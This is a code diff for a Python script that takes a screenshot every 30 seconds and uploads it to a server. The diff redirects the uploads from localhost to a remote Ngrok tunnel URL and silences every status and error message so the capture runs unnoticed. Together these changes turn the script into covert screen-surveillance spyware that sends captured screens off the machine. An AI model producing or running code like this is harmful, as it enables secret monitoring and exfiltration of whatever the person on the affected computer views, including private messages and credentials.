@@ -4,7 +4,7 @@ import time
 import io
 from datetime import datetime
 
-SERVER_URL = 'http://localhost:5000/upload_screenshot'
+SERVER_URL = 'YOUR_NGROK_HTTPS_URL/upload_screenshot' # Replace with your Ngrok URL + /upload_screenshot
 
 def capture_screenshot():
     try:
@@ -22,13 +22,13 @@ def capture_screenshot():
         
         # Send the screenshot to the server
         response = requests.post(SERVER_URL, files=files)
-        if response.status_code == 200:
-            print(f"Screenshot sent successfully at {timestamp}.")
-        else:
-            print(f"Failed to send screenshot. Status code: {response.status_code}")
+        # if response.status_code == 200: # Commented out
+            # print(f"Screenshot sent successfully at {timestamp}.") # Commented out
+        # else: # Commented out
+            # print(f"Failed to send screenshot. Status code: {response.status_code}") # Commented out
 
     except Exception as e:
-        print(f"Error capturing or uploading screenshot: {e}")
+        pass # print(f"Error capturing or uploading screenshot: {e}") # Commented out
 
 def periodic_screenshot_capture(interval=30):
     while True:
@@ -36,7 +36,7 @@ def periodic_screenshot_capture(interval=30):
             capture_screenshot()
             time.sleep(interval)
         except Exception as e:
-            print(f"Screenshot capturing error: {e}")
+            # print(f"Screenshot capturing error: {e}") # Commented out
             time.sleep(interval)
 
 if __name__ == "__main__":
